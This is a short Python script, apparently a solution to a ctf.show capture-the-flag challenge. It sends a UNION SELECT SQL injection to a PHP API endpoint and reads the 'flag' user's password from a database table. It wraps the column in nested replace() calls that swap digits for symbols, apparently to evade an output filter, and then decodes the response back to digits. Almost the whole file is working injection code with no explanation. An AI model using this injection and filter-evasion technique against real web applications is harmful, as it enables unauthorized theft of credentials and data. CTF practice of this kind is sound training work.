# author:yu22x
import urllib
import requests

url = "http://8becabfe-8853-4ced-b71d-5f8fff533fb5.challenge.ctf.show/api/v4.php?id=1' union select 'a',"
a1 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
a2 = ['!', '@', ']', '$', '_', '^', '=', '*', '(', ')']
s = "password"
for i in range(0, 10):
    s = "replace(" + s + ",{0},'{1}')".format(a1[i], a2[i])
u = url + 'substr(' + s + ',5)' + "from ctfshow_user4 where username='flag'%23"
print(u)
r = requests.get(u)
s2 = ""
for j in r.text:
    if j in a2:
        s2 += str(a1[a2.index(j)])
    else:
        s2 += j
print(s2)
